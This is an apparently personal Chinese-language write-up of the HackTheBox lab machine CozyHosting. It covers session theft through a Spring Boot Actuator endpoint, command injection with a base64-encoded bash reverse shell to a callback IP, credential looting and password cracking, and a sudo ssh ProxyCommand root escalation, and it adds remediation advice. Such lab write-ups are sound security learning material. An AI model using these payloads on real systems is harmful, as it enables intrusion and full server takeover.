## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:CozyHosting
2. 難度:Easy
3. IP:10.129.45.67  

### 主要發現：
1. 漏洞 ：透過不安全的端點配置獲取的使用者會話Cookie接管使用者帳號（風險等級：High）
2. 漏洞 ：透過命令注入漏洞達成遠端程式碼執行（風險等級：Critical）
3. 漏洞 ：未做權限管理的JAR檔內洩漏未做加密的硬編碼明文憑證（風險等級：High）
4. 漏洞 ：透過sudo權限利用ssh達成權限提升（風險等級：Critical）

### 攻擊鏈摘要：

系統預先安裝了一個Spring Boot應用程式，該應用程式啟用了Actuator端點。枚舉該端點可以發現使用者的會話cookie，從而獲得對主控制面板的身份驗證存取權。該應用程式存在命令注入漏洞，攻擊者可以利用該漏洞獲取遠端機器的反向shell。列舉應用程式的JAR檔案可以發現硬編碼的憑證，並利用這些憑證登入本機資料庫。資料庫包含一個雜湊密碼，破解後即可使用雜湊密碼以使用者身分登入伺服器。該使用者可以sudo權限執行ssh，攻擊者可以利用該權限完全提升伺服器權限。

### 潛在影響：

1. 洩漏敏感資訊，導致攻擊者無需密碼即可接管使用者帳號。
2. 攻擊者可在伺服器執行任意指令，建立反向Shell取得系統初步控制權。
3. 攻擊者可反編譯JAR檔獲取資料庫帳密，進而存取內部資料。
4. 一般使用者可利用sudo執行ssh跳過權限檢查，最終取得系統根權限。

### 修復建議：

1. 停用不必要的Actuator端點，或僅開放特定監控介面。
2. 強制要求對監控端點進行身份驗證與授權。
3. 避免直接調用系統Shell指令，優先使用API或函式庫。
4. 對所有使用者輸入進行嚴格的白名單過濾與驗證。
5. 嚴禁將密碼寫死在程式碼中。
6. 限制資料庫帳號權限，遵守最小權限原則。
7. 禁止一般使用者以sudo執行具備外部調用功能的指令。
8. 定期進行伺服器權限稽核。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.45.67 
sudo nmap -sT -Pn -sV -sC -O -p22,80 10.129.45.67 
sudo nmap -Pn --script=vuln -p22,80 10.129.45.67 
```

<img width="807" height="272" alt="螢幕擷取畫面 2026-03-05 204943" src="https://github.com/user-attachments/assets/9a8c2cec-3e6a-4686-a90f-2889e5d26332" />
<img width="1111" height="476" alt="螢幕擷取畫面 2026-03-05 204957" src="https://github.com/user-attachments/assets/60c9041c-106c-471f-b5df-66c1479d4f88" />
<img width="904" height="506" alt="螢幕擷取畫面 2026-03-05 211807" src="https://github.com/user-attachments/assets/2a0f3c0b-cb35-4a02-a8e3-da5c4e741fae" />

將掃描到的網域寫進/etc/hosts
```bash
sudo vi /etc/hosts
```
<img width="513" height="236" alt="螢幕擷取畫面 2026-03-05 205435" src="https://github.com/user-attachments/assets/1392d63b-97cf-4214-82c5-5e5d415f802d" />

探索80主頁

<img width="1534" height="814" alt="螢幕擷取畫面 2026-03-05 205526" src="https://github.com/user-attachments/assets/783e146e-6792-4904-880d-f31dce7704ba" />
<img width="1445" height="839" alt="螢幕擷取畫面 2026-03-05 205851" src="https://github.com/user-attachments/assets/c6181789-72ec-4d14-85bc-d82f24683da3" />


### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄，要注意一下/error是500
```bash
sudo gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/common.txt
```
<img width="810" height="498" alt="螢幕擷取畫面 2026-03-05 210208" src="https://github.com/user-attachments/assets/75821d62-1f7a-424a-b8a6-c255258cc236" />

探索/admin和/error都是奇怪的錯誤頁面

<img width="1354" height="590" alt="螢幕擷取畫面 2026-03-05 214515" src="https://github.com/user-attachments/assets/f97f258c-a8ed-4272-bc39-d378818b1488" />
<img width="1308" height="456" alt="螢幕擷取畫面 2026-03-05 220015" src="https://github.com/user-attachments/assets/99f9092e-6442-4a39-9bdd-b789138ba6b0" />

說實話，到這裡我卡住了，因為開放頁面只有80和/login，無論我怎麼枚舉、爆破以及PoC都沒有可攻擊的線索，我手上只剩下「奇怪的錯誤頁面」、「/error是500」、「Cookie貌似怪怪的」這三條線索，所以我抱著嘗試一下的想法把關鍵字拿去Google

<img width="822" height="862" alt="螢幕擷取畫面 2026-03-05 220412" src="https://github.com/user-attachments/assets/ea833ca2-d450-4842-9f9b-0fd1fecb840f" />

Google表示這種錯誤頁面可能屬於Spring Boot應用程式，且Actuator很危險，所以我嘗試了一下

<img width="1180" height="756" alt="螢幕擷取畫面 2026-03-05 221542" src="https://github.com/user-attachments/assets/f96d1201-63a2-4e5b-9fed-63746df752a0" />
<img width="932" height="868" alt="螢幕擷取畫面 2026-03-05 221621" src="https://github.com/user-attachments/assets/b85bb6af-2453-450b-a93c-212294eec458" />



### 2.3 初始存取(Initial Access)

抓取/actuator/sessions內容
```bash
curl http://cozyhosting.htb/actuator/sessions
```
<img width="548" height="158" alt="螢幕擷取畫面 2026-03-05 223528" src="https://github.com/user-attachments/assets/1943671b-3fee-4ddc-87de-b40bb770679e" />

使用F12開發者工具將session竄改，並訪問/admin

<img width="1848" height="879" alt="螢幕擷取畫面 2026-03-05 223617" src="https://github.com/user-attachments/assets/c6bc2782-8c98-4cc7-ae73-7e20cffbe079" />

頁面裡有個似乎是ssh連線工具，有公鑰，推估使用命令應該是
```bash
ssh -i authorised_key username@hostname
```

<img width="1796" height="629" alt="螢幕擷取畫面 2026-03-05 224113" src="https://github.com/user-attachments/assets/57a650b2-8040-4698-9ccd-c9aa148ced55" />
<img width="1830" height="686" alt="螢幕擷取畫面 2026-03-05 224245" src="https://github.com/user-attachments/assets/978bfea9-4f2e-4b62-8f58-146a0f892254" />

因為頁面主動使用系統命令，我嘗試破壞掉命令語句並注入命令，使用Burp Suite嘗試，經過各方嘗試以後反斜線和註解的方式有效
```bash
;`id`;#
```

<img width="1137" height="550" alt="螢幕擷取畫面 2026-03-05 224836" src="https://github.com/user-attachments/assets/99211ee9-c159-4e26-8b5f-98746ca8c331" />
<img width="1113" height="538" alt="螢幕擷取畫面 2026-03-05 233656" src="https://github.com/user-attachments/assets/689d39d1-7d09-4cf3-9aca-2bd79b184698" />

嘗試反彈Shell，卻被告知命令不可有空格

<img width="1357" height="623" alt="螢幕擷取畫面 2026-03-05 233739" src="https://github.com/user-attachments/assets/923ae0b4-0c17-43d0-85ce-fe559abfb6db" />

我嘗試利用${IFS}代替空格，被告知有語法錯誤

<img width="1271" height="648" alt="螢幕擷取畫面 2026-03-05 234007" src="https://github.com/user-attachments/assets/a09e1c39-41df-4453-87b1-25405e19d797" />

總結下來，payload不可包含空格，雖說可用${IFS}代替，但因原本就是破壞型注入，很容易因為{}等字元造成語法錯誤，所以必須進行編碼後解碼，我的思路為:

1. 空格改成${IFS}，先解決空格問題。
2. 進行base64編碼，解決語法錯誤問題。
3. 解碼base64，使其能被執行。
4. 再使用URL編碼，使payload能透過Burp Suite送出。

只要有錯誤訊息就可以對症下藥，以下的原碼請自行編碼。
```bash
;`bash -i >& /dev/tcp/10.10.14.229/1234 0>&1`;
;`echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjkvMTIzNCAwPiYx" | base64 -d | bash`;
```
<img width="1353" height="709" alt="螢幕擷取畫面 2026-03-05 234711" src="https://github.com/user-attachments/assets/d63e6691-559a-4977-81a0-04359151c097" />

獲得反彈Shell

<img width="869" height="314" alt="螢幕擷取畫面 2026-03-05 234730" src="https://github.com/user-attachments/assets/6d2984d1-f33c-499a-9a66-8fc2b2edd1bb" />


### 2.4 橫向移動(Lateral Movement)

在現目錄下有個jar檔

<img width="679" height="114" alt="螢幕擷取畫面 2026-03-05 235639" src="https://github.com/user-attachments/assets/a2bd91dd-0464-44ff-a6c9-f3b85320ad4c" />

抓回本地拆封
```bash
python3 -m http.server 4444
wget http://10.129.45.67:4444/cloudhosting-0.0.1.jar
unzip cloudhosting-0.0.1.jar
```
<img width="489" height="40" alt="螢幕擷取畫面 2026-03-05 235650" src="https://github.com/user-attachments/assets/14ed001b-f286-40a2-9941-82d530f5ebbd" />
<img width="1032" height="633" alt="螢幕擷取畫面 2026-03-06 000039" src="https://github.com/user-attachments/assets/b53b07fd-af9e-4cc2-8892-76759c0aa43a" />
<img width="477" height="74" alt="螢幕擷取畫面 2026-03-06 000057" src="https://github.com/user-attachments/assets/fcbaf287-a9ec-4601-b389-a59e352c42fe" />

在其中發現某檔案存在資料庫的憑證明文

<img width="702" height="276" alt="螢幕擷取畫面 2026-03-06 000201" src="https://github.com/user-attachments/assets/b88bb0e8-88d2-4f5c-aeda-3146d46991b8" />

回到反彈Shell進入並枚舉資料庫
```bash
psql -h localhost -U postgres
\list
\c cozyhosting
\dt
SELECT * FROM users;
```
<img width="869" height="363" alt="螢幕擷取畫面 2026-03-06 001009" src="https://github.com/user-attachments/assets/3378f268-e7e7-40fe-bf81-7ca449a221ec" />
<img width="883" height="585" alt="螢幕擷取畫面 2026-03-06 001220" src="https://github.com/user-attachments/assets/949393ae-11a5-44d5-bef5-4d9a5d36f9c5" />

將密碼哈希值回到本地另存成文字檔，並破解
```bash
nano hash
john hash --wordlist=/user/share/wordlists/rocktou.txt
```
<img width="595" height="157" alt="螢幕擷取畫面 2026-03-06 001327" src="https://github.com/user-attachments/assets/3400bb9e-64aa-4777-8dac-fa24704789bd" />
<img width="761" height="165" alt="螢幕擷取畫面 2026-03-06 001621" src="https://github.com/user-attachments/assets/8847401e-42bc-4c9f-b18b-a02934400243" />

透過密碼登入ssh服務，使用者名稱可見/HOME目錄或是/etc/passwd

<img width="760" height="770" alt="螢幕擷取畫面 2026-03-06 001718" src="https://github.com/user-attachments/assets/0f83fa52-b10d-4b62-9243-81e74ff37f10" />

取得user.txt

<img width="338" height="102" alt="螢幕擷取畫面 2026-03-06 001753" src="https://github.com/user-attachments/assets/1c575ada-7d4f-4a17-a0e8-e89cf0361060" />



### 2.5 權限提升(Privilege Escalation)

枚舉sudo權限
```bash
sudo -l
```
<img width="1160" height="173" alt="螢幕擷取畫面 2026-03-06 001839" src="https://github.com/user-attachments/assets/26be975b-98cd-48fd-8219-d1b6c55db570" />

ssh有一個功能ProxyCommand，用於通過跳板機代理到遠程主機，這個功能可以執行系統命令，可以利用它提權。

用參數-o為引導，指定到遠程主機，但因提權使用，並不想連接到哪裡，所以命令最後補一個x不讓它空著。

提權邏輯來自bash 0<&2 1>&2，但單純輸入這樣，ssh在開始密鑰交換時，會因為我們做的重定向而無法與主機通訊，而導致錯誤，所以前面先給SSH個空命令並用;隔開，讓它先成功，然後再讓ssh執行系統命令。

這條命令在GTFOBins有完整呈現，但沒有解說，當然可以直接複製拿去用，但最好還是要懂其中邏輯關係。
```bash
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```
<img width="607" height="89" alt="螢幕擷取畫面 2026-03-06 002320" src="https://github.com/user-attachments/assets/16d046ff-8b21-466a-a447-af9766249342" />


### 2.6 最終成果(Impact)

獲得root.txt

<img width="1035" height="181" alt="螢幕擷取畫面 2026-03-06 002437" src="https://github.com/user-attachments/assets/cc8d90ec-2072-48f8-a6ac-22579f35028b" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 透過Google搜尋將沒注意到的攻擊面找出來。
2. 命令注入看似複雜，只要跟著錯誤訊息去編就可以。
3. sudo ssh的提權因已提前了解過邏輯關係，很快就解決了，也不用去GTFOBins搜尋。


### 浪費時間的部分：

1. 應早點對奇怪的錯誤訊息頁面動手，不該在/login這個兔子洞浪費太多時間。

### 新知識點：

1. 關於Spring Boot應用程式的應對方式。

### 與實戰對應：

1. 遇到走投無路的情況還是要Google。
2. 命令注入繞過不能急，要看著錯誤訊息一點一點解決。
3. 應提前了解工具的用途以及能力，在提權時可以加快速度。

